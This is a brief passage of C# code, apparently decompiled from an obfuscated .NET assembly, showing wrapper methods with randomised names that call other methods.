		return bpE5xp3kALvGO65SSOB.edv36NoIr(P_0, (bpE5xp3kALvGO65SSOB)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void fXvEJtyBxAjGkZraNBv()
	{
		WkMgYHbfSUMGdoITRx.gIGiY8hzeM6TJ();
	}
}
